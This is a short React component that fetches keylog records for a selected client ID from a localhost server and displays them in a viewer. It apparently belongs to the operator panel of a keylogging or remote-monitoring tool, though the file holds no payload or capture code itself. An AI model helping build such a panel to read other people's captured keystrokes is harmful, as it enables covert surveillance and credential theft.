import React from "react";
import KeylogViewer from "./KeyLogViewer";
import { GlobalContext } from "../App";

const Keylogs = () => {
  const [data, setData] = React.useState(null);
  const { selectedClientId } = React.useContext(GlobalContext);
  React.useEffect(() => {
    if (!selectedClientId) return;
    fetch(`http://localhost:3001/keylogs/${selectedClientId}`)
      .then((res) => res.json())
      .then((res) => {
        setData(res);
      })
      .catch((err) => {
        setData([]);
        console.error(err);
      });
  }, [selectedClientId]);
  return <div>{data && <KeylogViewer keylogs={data} />}</div>;
};

export default Keylogs;
